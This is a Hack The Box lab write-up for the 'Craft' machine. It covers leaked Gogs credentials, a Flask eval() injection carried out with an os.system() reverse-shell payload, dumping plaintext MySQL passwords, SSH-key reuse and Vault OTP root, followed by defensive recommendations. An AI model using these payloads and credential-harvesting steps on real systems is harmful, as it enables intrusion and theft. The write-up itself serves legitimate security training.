---
title: "Craft — eval() Injection, Credential Reuse, and Vault SSH OTP"
description: "Leaked Gogs source exposes hardcoded API credentials and a Flask eval() call for container root; database credential reuse, a Gogs SSH key, and HashiCorp Vault SSH OTP then provide host root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - web
  - code-review
  - credential-reuse
  - hashicorp-vault
objective: "Exploit leaked source-control credentials and an eval() injection in the Flask API, then pivot from container root to host root."
tools:
  - rustscan
  - gobuster
  - curl
  - python3
  - pymysql
  - ssh
  - vault
skill: "Source-code review, Python eval() injection, and credential-reuse pivoting"
outcome: "Root in the application container via eval() RCE, host access via a reused Gogs credential and SSH key, and host root through HashiCorp Vault SSH OTP"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Medium |
| Target environment | Linux: Dockerized Flask API behind nginx, with internal MySQL, Gogs, and HashiCorp Vault |
| Starting position | Unauthenticated network access |
| Objective | Reach container root through the Flask API, then escalate to host root |
| Outcome | Container root via `eval()` RCE; host root via a reused Gogs credential, an SSH key, and Vault SSH OTP |

## From a Gogs source leak to host root

Craft is a Medium Linux lab on Hack The Box. A Gogs instance publishes the application source, and two commit diffs expose hardcoded API credentials and a Python `eval()` call in the Flask brew API. The `eval()` injection yields root inside the application's Docker container, where the Flask configuration and the MySQL `user` table expose plaintext credentials. One recovered password is reused on Gogs, whose private `craft-infra` repository holds an SSH private key that grants host access, and HashiCorp Vault's SSH one-time password engine then provides root on the host. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **Gogs source leak → hardcoded API credentials → JWT → `eval()` injection RCE → container root → MySQL plaintext credentials → reused Gogs password → repository SSH key → host shell → HashiCorp Vault SSH OTP → host root**

## Target, exposed services, and virtual hosts

- **Target:** Linux host running a Dockerized Flask API behind nginx.
- **Exposed services:** SSH (22), HTTPS nginx (443), and a Golang `x/crypto/ssh` server (6022).
- **Virtual hosts:** the HTTPS certificate exposes `<TARGET_HOST>`, and enumeration adds `api.<TARGET_HOST>`, `gogs.<TARGET_HOST>`, and `vault.<TARGET_HOST>`.
- **Starting position:** unauthenticated network access, with no provided credentials.
- **Objective:** obtain code execution in the web application and escalate to root on the host.
- **Constraints:** activity was confined to the Hack The Box lab environment.

## Evidence: source review to Vault OTP

### 1. Port and Service Enumeration

Observation: I checked the exposed services with a fast TCP scan and recorded their versions.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/craft-tcp
```

```text
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
443/tcp open  ssl/http nginx 1.15.8
6022/tcp open  ssh      Golang x/crypto/ssh server (protocol 2.0)
```

Significance: the HTTPS server is the primary application surface. Port 6022 carries a second, nonstandard SSH listener: an unconventional Golang SSH service distinct from the host's OpenSSH, which indicates an additional SSH surface beyond the standard port; post-exploitation later confirms the Docker-based deployment it belongs to. The TLS certificate exposes the domain `<TARGET_HOST>`.

Result: nginx on 443 and two SSH listeners are identified, and the domain is recovered from the certificate.

### 2. Web Application and Virtual-Host Enumeration

Observation: `https://<TARGET_HOST>/` serves an API description page for a craft-brew repository that references a Gogs instance.

Action: virtual-host discovery.

```bash
gobuster vhost --url https://<TARGET_HOST> --wordlist <WORDLIST> --append-domain -k
```

```text
Found: api.<TARGET_HOST> Status: 404 [Size: 233]
Found: vault.<TARGET_HOST> Status: 404 [Size: 19]
```

Significance: the 404 responses still resolve distinct virtual hosts, which adds `api.<TARGET_HOST>` and `vault.<TARGET_HOST>` to the known `gogs.<TARGET_HOST>` instance.

Result: three application virtual hosts are identified for review.

### 3. Source Review: Hardcoded API Credentials

Observation: the Gogs instance at `gogs.<TARGET_HOST>` hosts the `craft-api` repository, and a commit diff contains a plaintext authentication request.

```python
response = requests.get('https://api.<TARGET_HOST>/api/auth/login',
                        auth=('<USER_1>', '<CRED_1>'), verify=False)
```

Action: the same credentials authenticate against the API.

```bash
curl -H "Content-Type: application/json" -k -X GET https://api.<TARGET_HOST>/api/auth/login -u '<USER_1>:<CRED_1>'
```

```json
{"token":"<JWT_TOKEN>"}
```

Significance: credentials committed to source control are directly usable, and the endpoint returns a JSON Web Token that authorizes the API.

Result: an authenticated API session token is obtained.

### 4. Source Review: `eval()` in the Brew Endpoint

Observation: a later commit adds an `abv` sanity check that interpolates request data into Python's `eval()`.

```python
+        if eval('%s > 1' % request.json['abv']):
+            return "ABV must be a decimal value less than 1.0", 400
```

Significance: the code concatenates `abv` into `eval()` with no sanitization, so the brew endpoint evaluates any posted string as Python.

Result: the brew creation endpoint exposes arbitrary code execution.

### 5. Exploitation: `eval()` Remote Code Execution

Observation: the token authorizes the brew endpoint, and the `abv` parameter reaches `eval()`.

Action: an authenticated request supplies an `os.system()` payload.

```python
cmd = '__import__("os").system("<REVERSESHELL_COMMAND>")'
brew_dict = {"abv": cmd, "name": "test", "brewer": "test", "style": "test"}
headers = {"X-Craft-API-Token": token, "Content-Type": "application/json"}
requests.post("https://api.<TARGET_HOST>/api/brew/", headers=headers,
              data=json.dumps(brew_dict), verify=False)
```

The caught shell returns an identity check:

```text
uid=0(root) gid=0(root) groups=0(root),1(bin),...
```

Significance: the command executes as `root`, but the hostname `<CONTAINER_ID>` shows this is the application container rather than the host.

Result: root code execution is confirmed inside the Flask container.

### 6. Post-Exploitation: Container Configuration and MySQL Credentials

Observation: the container's Flask settings file holds the database connection parameters.

```bash
cat settings.py
```

```python
MYSQL_DATABASE_USER = '<DB_USER>'
MYSQL_DATABASE_PASSWORD = '<DB_PASSWORD>'
MYSQL_DATABASE_DB = 'craft'
MYSQL_DATABASE_HOST = 'db'
```

Significance: the credentials point at `db`, a separate container on the same Docker network, so the container root has a path to the application database.

Result: MySQL credentials for the internal database are recovered.

### 7. Post-Exploitation: Database User Enumeration

Observation: the configured account can reach the database and enumerate its tables.

```sql
show tables;
```

```text
[{'Tables_in_craft': 'brew'}, {'Tables_in_craft': 'user'}]
```

The `user` table is then dumped:

```sql
select * from user;
```

```text
[{'id': 1, 'username': '<USER_1>', 'password': '<CRED_1>'}, {'id': 4, 'username': '<USER_2>', 'password': '<CRED_2>'}, {'id': 5, 'username': '<USER_3>', 'password': '<CRED_3>'}]
```

Significance: the `user` table stores all three application passwords in plaintext, and `<CRED_3>` is the same value as the `<USER_3>` Gogs account password, which shows cross-service credential reuse.

Result: three plaintext credential pairs are recovered, one of which is reused on Gogs.

### 8. Post-Exploitation: Gogs Pivot and SSH Access

Observation: the reused `<USER_3>` password authenticates to Gogs, where the private `craft-infra` repository contains an SSH private key. I could not verify the Gogs login from captured output; the notes report that the credentials granted access to the repository and its key.

```bash
ssh <USER_3>@<TARGET_HOST> -i <SSH_KEY_FILENAME>
```

The key's passphrase, which is the same reused value, is accepted:

```text
Enter passphrase for key '<SSH_KEY_FILENAME>': <CRED_3>
```

Significance: one reused secret protects both the Gogs account and the SSH key, so a single recovered password crosses from the database to host authentication.

Result: a `<USER_3>` shell is obtained on the host.

### 9. Privilege Escalation: HashiCorp Vault SSH OTP

Observation: from the `<USER_3>` session, HashiCorp Vault's SSH secrets engine is available and can issue a one-time password for `root@127.0.0.1`.

```bash
vault ssh root@127.0.0.1
```

```text
OTP for the session is: <OTP_VALUE>
Password: <OTP_VALUE>
```

The resulting session runs as root on the host:

```text
root@<HOST>:~#
```

Significance: Vault mints a single-use password bound to the target and supplies it to SSH, so the existing Vault authorization, not a new vulnerability, grants root.

Result: the OTP is accepted and a root shell is obtained on the host.

## Three decisions: commit diffs, container root, and Vault authorisation

| Challenge | Decision | Rationale |
|---|---|---|
| Both flaws were only visible in the repository's commit history | Reviewed the commit diffs directly | The diffs exposed the committed credentials and the eval() call |
| The first shell was root but confined to the application container | Enumerated the container's own configuration and database to pivot | Container root does not grant host access on its own |
| Host elevation beyond `<USER_3>` was still required | Requested an SSH OTP through existing HashiCorp Vault authorization | The user's Vault policy permitted root OTP issuance, so no separate exploit was needed |

## Outcome: container root and host root

The documented path reaches root code execution in the application container through the Flask `eval()` injection and root on the host through HashiCorp Vault's SSH OTP engine. The initial root shell was scoped to the application container, so host access depended on the credentials and SSH key recovered from the database and Gogs.

## Recommendations: committed secrets, eval(), reuse, and Vault scope

The following recommendations were not tested during this case study.

1. **Secrets committed to source control.** Hardcoded API credentials in a repository commit authenticated to the API without any exploitation. *Recommendation:* move secrets into a secrets manager and add pre-commit or CI scanning for credential patterns. *Detection:* scan repositories and their history for committed secrets.
2. **`eval()` on untrusted input.** The `abv` parameter is evaluated by Python, yielding root inside the container. *Recommendation:* validate `abv` with a type-safe numeric check such as a `float()` comparison. *Validation:* review code and run SAST for `eval`/`exec` reached from request data.
3. **Plaintext credentials reused across services.** The database stored passwords in plaintext and the `<USER_3>` value was reused for Gogs and the SSH key passphrase, so one leak crossed multiple trust boundaries. *Recommendation:* enforce unique credentials per service and avoid storing recoverable passwords. *Detection:* flag identical secrets appearing across services.
4. **Over-broad Vault SSH authorization.** A standard application account could mint a root one-time password. *Recommendation:* restrict the SSH secrets engine and OTP issuance to authorized administrative roles. *Detection:* monitor Vault audit logs for OTP requests from non-administrative identities.

## References

- [Hack The Box — Craft](https://app.hackthebox.com/machines/Craft) (retired machine)
- [RustScan](https://github.com/RustScan/RustScan) (port scanner)
- [Gobuster](https://github.com/OJ/gobuster) (directory, DNS, and virtual-host discovery)
- [curl — command-line tool and library](https://curl.se/docs/manpage.html)
- [Python — `eval` built-in function](https://docs.python.org/3/library/functions.html#eval)
- [PyMySQL](https://github.com/PyMySQL/PyMySQL) (Python MySQL client)
- [HashiCorp Vault — SSH secrets engine](https://developer.hashicorp.com/vault/docs/secrets/ssh)
- [Gogs](https://gogs.io/) (self-hosted Git service)
- [OpenSSH manual pages](https://www.openssh.com/manual.html)
